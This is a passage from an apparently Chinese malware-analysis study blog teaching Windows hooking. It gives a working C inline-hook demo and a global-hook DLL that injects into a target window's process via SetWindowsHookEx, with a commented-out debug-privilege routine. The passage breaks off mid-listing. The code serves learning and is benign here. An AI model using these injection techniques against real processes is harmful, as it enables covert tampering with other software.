class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE code[<span class="number">20</span>];	<span class="comment">//存储原硬编码</span></span><br><span class="line">DWORD dwCodeAddr;</span><br><span class="line">LPSTR lpszParam;	<span class="comment">//函数参数</span></span><br><span class="line">DWORD dwRet;	<span class="comment">//指向函数返回地址</span></span><br><span class="line">DWORD codeLength;	<span class="comment">//覆盖目标代码段数据长度</span></span><br><span class="line">DWORD dwdstFuncAddr;	</span><br><span class="line">DWORD dwsrcFuncAddr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Reg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD EAX;</span><br><span class="line">	DWORD ECX;</span><br><span class="line">	DWORD EDX;</span><br><span class="line">	DWORD EBX;</span><br><span class="line">	DWORD ESP;</span><br><span class="line">	DWORD EBP;</span><br><span class="line">	DWORD ESI;</span><br><span class="line">	DWORD EDI;</span><br><span class="line">	DWORD EFL;</span><br><span class="line">&#125;reg;	</span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">AddrTranslation</span><span class="params">(LPVOID lpFuncAddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//检测程序是否开启增量链接</span></span><br><span class="line">	<span class="keyword">if</span>(*(BYTE*)lpFuncAddr == <span class="number">0xe9</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//地址转换, 将jmp func指令地址转化为真正的函数地址</span></span><br><span class="line">		<span class="keyword">return</span> (LPVOID)(*(DWORD*)((DWORD)lpFuncAddr+<span class="number">1</span>) + (DWORD)lpFuncAddr + <span class="number">5</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> lpFuncAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID __declspec(naked)InlineHook()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov reg.EAX,eax</span><br><span class="line">		mov reg.ECX,ecx</span><br><span class="line">		mov reg.EDX,edx</span><br><span class="line">		mov reg.EBX,ebx</span><br><span class="line">		mov eax,[esp+<span class="number">0x10</span>]</span><br><span class="line">		mov reg.ESP,eax</span><br><span class="line">		mov reg.EBP,ebp</span><br><span class="line">		mov reg.ESI,esi</span><br><span class="line">		mov reg.EDI,edi</span><br><span class="line">		mov eax,[esp]</span><br><span class="line">		mov reg.EFL,eax</span><br><span class="line">		mov eax,[esp+<span class="number">4</span>*<span class="number">10</span>]</span><br><span class="line">		mov lpszParam,eax</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打印寄存器的值</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;eax: %x\n&quot;</span>,reg.EAX);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ecx: %x\n&quot;</span>,reg.ECX);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;edx: %x\n&quot;</span>,reg.EDX);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ebx: %x\n&quot;</span>,reg.EBX);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;esp: %x\n&quot;</span>,reg.ESP);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ebp: %x\n&quot;</span>,reg.EBP);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;esi: %x\n&quot;</span>,reg.ESI);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;edi: %x\n&quot;</span>,reg.EDI);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;elf: %x\n&quot;</span>,reg.EFL);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打印函数参数</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;函数参数: %s\n&quot;</span>, lpszParam);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//恢复代码</span></span><br><span class="line"><span class="comment">//	memcpy((LPVOID)dwsrcFuncAddr, &amp;code, codeLength);</span></span><br><span class="line">	dwCodeAddr = (DWORD)&amp;code;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		jmp dwCodeAddr</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetInlineHook</span><span class="params">(LPVOID lpdstFuncAddr, LPVOID lpsrcFuncAddr, DWORD codeLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//地址转换, 将jmp SayHello指令地址转化为真正的函数地址</span></span><br><span class="line">	dwdstFuncAddr = (DWORD)AddrTranslation(lpdstFuncAddr);</span><br><span class="line">	dwsrcFuncAddr = (DWORD)AddrTranslation(lpsrcFuncAddr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将原代码的硬编码存储在code数组中</span></span><br><span class="line">	codeLength = codeLen;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;code, (LPVOID)dwsrcFuncAddr, codeLength);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//计算jmp的硬编码</span></span><br><span class="line">	BYTE shellCode[<span class="number">5</span>] = &#123;</span><br><span class="line">		<span class="number">0xe9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line">	DWORD jmpAddr = dwdstFuncAddr - (dwsrcFuncAddr + <span class="number">5</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>((LPVOID)((DWORD)&amp;shellCode+<span class="number">1</span>), &amp;jmpAddr, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//修改页面属性</span></span><br><span class="line">	DWORD flOldProtect;</span><br><span class="line">	<span class="keyword">if</span>(!(VirtualProtectEx(GetCurrentProcess(), (LPVOID)dwsrcFuncAddr, codeLength, PAGE_EXECUTE_READWRITE, &amp;flOldProtect) &amp;&amp; </span><br><span class="line">		VirtualProtectEx(GetCurrentProcess(), (LPVOID)&amp;code, <span class="keyword">sizeof</span>(code), PAGE_EXECUTE_READWRITE, &amp;flOldProtect)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;页面属性设置失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将shellCode写入代码中</span></span><br><span class="line">	<span class="built_in">memset</span>((LPVOID)dwsrcFuncAddr, <span class="number">0x90</span>, codeLength);</span><br><span class="line">	<span class="built_in">memcpy</span>((LPVOID)dwsrcFuncAddr, &amp;shellCode, <span class="keyword">sizeof</span>(shellCode));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//jmp跳转至code执行被Hook的代码</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//原函数返回地址</span></span><br><span class="line">	dwRet = dwsrcFuncAddr - (DWORD)&amp;code - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置返回ShellCode</span></span><br><span class="line">	<span class="built_in">memset</span>((LPVOID)((DWORD)&amp;shellCode+<span class="number">1</span>), <span class="number">0</span>, <span class="keyword">sizeof</span>(shellCode)<span class="number">-1</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>((LPVOID)((DWORD)&amp;shellCode+<span class="number">1</span>), &amp;dwRet, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">	<span class="built_in">memcpy</span>((LPVOID)((DWORD)&amp;code+codeLength), &amp;shellCode, <span class="keyword">sizeof</span>(shellCode));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">UnsetInlineHook</span><span class="params">(LPVOID lpsrcFuncAddr, DWORD codeLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//恢复被Hook函数的硬编码</span></span><br><span class="line">	<span class="built_in">memcpy</span>((LPVOID)dwsrcFuncAddr, &amp;code, codeLen);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//恢复代码段的页属性</span></span><br><span class="line">	DWORD flOldProtect;</span><br><span class="line">	<span class="keyword">if</span>(!VirtualProtectEx(GetCurrentProcess(), (LPVOID)dwsrcFuncAddr, codeLength, PAGE_EXECUTE_READ, &amp;flOldProtect))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;页面属性恢复失败!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">SayHello</span><span class="params">(LPSTR lpszName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nhaha,%s!\n&quot;</span>, lpszName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//初始化code数组</span></span><br><span class="line">	<span class="built_in">memset</span>(code, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置InlineHook</span></span><br><span class="line">	SetInlineHook(InlineHook, SayHello, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">	SayHello(<span class="string">&quot;walker&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//卸载InlineHook</span></span><br><span class="line">	UnsetInlineHook(SayHello, <span class="number">6</span>);</span><br><span class="line">	SayHello(<span class="string">&quot;lala&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>效果图如下：</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210221184641507.png" alt="image-20210221184641507" style="zoom:67%;" align="left">



<h3 id="Global-Hook"><a href="#Global-Hook" class="headerlink" title="Global Hook"></a>Global Hook</h3><p>当我们想要设置全局钩子时，那么钩子函数必须设置在 <code>Dll</code> 文件中。这是由于进程空间是相对独立，发生对应事件的进程不能调用其他进程空间中钩子的消息处理函数。当钩子的消息处理函数是在 <code>Dll</code> 中实现的，则当进程发生对应事件时，系统会将这个 <code>Dll</code> 加载到发生相应事件的进程地址空间中，使其能够调用钩子消息处理函数进行处理。（事实上，只需要将全局钩子的回调函数在在 <code>Dll</code> 中实现即可，但是处于方便起见，可以将全局钩子的设置、卸载、消息处理函数封装在同一个 <code>Dll</code> 中。）</p>
<p>在操作系统安装全局钩子后，只要进程接收到可以发出钩子的消息，全局钩子的 <code>Dll</code> 文件就会由操作系统自动或强行地加载到该进程中。<strong>因此，设置全局钩子可以达到 <code>Dll</code> 注入的目的。我们也可以实现通过自定义消息实现进程间的通信。</strong></p>
<p><strong>存在哪些坑？</strong></p>
<p>通过 <code>SetWindowsHookEx</code> 函数注入的消息处理函数可以正常处理收到的自定义消息，但是当被注入的消息处理函数调用 <code>MessageBox</code> 时，会致使进程崩溃，暂时无法解决。</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210224145424410.png" alt="image-20210224145424410" style="zoom:80%;" align="left">



<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210225183845185.png" alt="image-20210225183845185" style="zoom:80%;" align="left">



<p><strong>已解决！！！</strong></p>
<p>回调函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">GetMsgProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ <span class="keyword">int</span>    code,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ LPARAM lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// 当初把 CALLBACK 给落下啦...</span></span><br></pre></td></tr></table></figure>





<hr>
<p>测试代码如下：</p>
<p><strong>Dll</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SharedMemory</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD dwBuffMax;</span><br><span class="line">	DWORD dwBuffLen;</span><br><span class="line">	LPSTR  lpszBuff;</span><br><span class="line">&#125;*sm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> HMODULE g_hModuleOfDll;</span><br><span class="line">HHOOK g_hHook;</span><br><span class="line">BYTE szBuff[<span class="number">100</span>];</span><br><span class="line">HANDLE hMapObject;					</span><br><span class="line">LPVOID lpszSharedBuff;					</span><br><span class="line">	</span><br><span class="line"><span class="function">BOOL <span class="title">CreateSharedMemory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;				</span><br><span class="line">	<span class="comment">//创建FileMapping对象					</span></span><br><span class="line">	hMapObject = CreateFileMapping((HANDLE)<span class="number">0xFFFFFFFF</span>,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="number">0</span>,<span class="number">0x1000</span>,TEXT(<span class="string">&quot;shared&quot;</span>));					</span><br><span class="line">	<span class="keyword">if</span>(!hMapObject)									</span><br><span class="line">		<span class="keyword">return</span> FALSE;				</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//将FileMapping对象映射到自己的进程					</span></span><br><span class="line">	lpszSharedBuff = MapViewOfFile(hMapObject,FILE_MAP_WRITE,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);					</span><br><span class="line">	<span class="keyword">if</span>(!lpszSharedBuff)								</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	</span><br><span class="line">	sm = lpszSharedBuff;</span><br><span class="line">	sm-&gt;dwBuffMax = <span class="number">0x100</span>;</span><br><span class="line">	sm-&gt;lpszBuff = (LPSTR)((DWORD)lpszSharedBuff+<span class="number">12</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 提权函数：提升为DEBUG权限 (貌似没什么作用？？？)</span></span><br><span class="line"><span class="comment">BOOL EnableDebugPrivilege()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	HANDLE hToken;</span></span><br><span class="line"><span class="comment">	BOOL fOk = FALSE;</span></span><br><span class="line"><span class="comment">	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		TOKEN_PRIVILEGES tp;</span></span><br><span class="line"><span class="comment">		tp.PrivilegeCount = 1;</span></span><br><span class="line"><span class="comment">		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;</span></span><br><span class="line"><span class="comment">		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">		fOk = (GetLastError() == ERROR_SUCCESS);</span></span><br><span class="line"><span class="comment">		CloseHandle(hToken);</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	return fOk;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">Write</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(sm-&gt;dwBuffMax &lt; dwBuffLen)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	ZeroMemory(sm-&gt;lpszBuff, g_dwBuffMax);</span><br><span class="line">	<span class="built_in">memcpy</span>(sm-&gt;lpszBuff, lpszBuff, dwBuffLen);</span><br><span class="line">	sm-&gt;dwBuffLen = dwBuffLen;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">Read</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(dwBuffLen &lt; sm-&gt;dwBuffLen)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	ZeroMemory(lpszBuff, dwBuffLen);</span><br><span class="line">	<span class="built_in">memcpy</span>(lpszBuff, sm-&gt;lpszBuff, sm-&gt;dwBuffLen);</span><br><span class="line">	<span class="keyword">return</span> sm-&gt;dwBuffLen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetWindowThreadID</span><span class="params">(LPSTR lpszWindowName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 初始化</span></span><br><span class="line">	HANDLE hProcess;</span><br><span class="line">	HANDLE hThreadSnap = <span class="literal">NULL</span>;	<span class="comment">// 模块快照</span></span><br><span class="line">	DWORD th32ThreadID = <span class="number">0</span>;</span><br><span class="line">	DWORD dwPid = <span class="number">0x00</span>;</span><br><span class="line">	THREADENTRY32 thread32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BOOL bMoreOfThread;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取进程句柄</span></span><br><span class="line">	HWND hwnd = FindWindow(<span class="literal">NULL</span>, lpszWindowName);</span><br><span class="line">	<span class="keyword">if</span> (!hwnd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;获取进程句柄失败！\n&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	GetWindowThreadProcessId(hwnd, &amp;dwPid);</span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//获取线程ID</span></span><br><span class="line">	thread32.dwSize = <span class="keyword">sizeof</span>(thread32);</span><br><span class="line"></span><br><span class="line">	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//printf(&quot;获取线程信息失败！\n&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bMoreOfThread = Thread32First(hThreadSnap, &amp;thread32);</span><br><span class="line">	<span class="keyword">while</span> (bMoreOfThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (thread32.th32OwnerProcessID == dwPid)</span><br><span class="line">		&#123;</span><br><span class="line">			th32ThreadID = thread32.th32ThreadID;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		bMoreOfThread = Thread32Next(hThreadSnap, &amp;thread32);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hThreadSnap);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> th32ThreadID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 钩子回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MessageProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> nCode,</span></span></span><br><span class="line"><span class="params"><span class="function">	WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nCode == HC_ACTION)</span><br><span class="line">	&#123;</span><br><span class="line">		PCWPSTRUCT pcw = (PCWPSTRUCT)lParam;</span><br><span class="line">		<span class="keyword">if</span> (pcw-&gt;message == WM_USER + <span class="number">0x1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			OutputDebugString(<span class="string">&quot;receive data: &quot;</span>);</span><br><span class="line">			OutputDebugString(sm-&gt;lpszBuff);</span><br><span class="line">			OutputDebugString(<span class="string">&quot;------\n&quot;</span>);</span><br><span class="line">			ZeroMemory(szBuff, <span class="keyword">sizeof</span>(szBuff));</span><br><span class="line">			<span class="built_in">sprintf</span>(szBuff, <span class="string">&quot;wParam: %d\nlParam: %d\nPID: %d\n&quot;</span>, pcw-&gt;wParam, pcw-&gt;lParam,GetCurrentProcessId());</span><br><span class="line">			OutputDebugString(szBuff);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置全局钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetGlobalHook</span><span class="params">(<span class="keyword">int</span> idHook, LPSTR lpszWindowName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD threadID = GetWindowThreadID(lpszWindowName);</span><br><span class="line">	<span class="keyword">if</span>(!threadID)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;获取目标进程PID失败!&quot;</span>, <span class="string">&quot;note&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_hHook = SetWindowsHookEx(idHook, (HOOKPROC)MessageProc, g_hModuleOfDll, threadID);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == g_hHook)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnsetGlobalHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (g_hHook)</span><br><span class="line">	&#123;</span><br><span class="line">		UnhookWindowsHookEx(g_hHook);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>测试程序</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 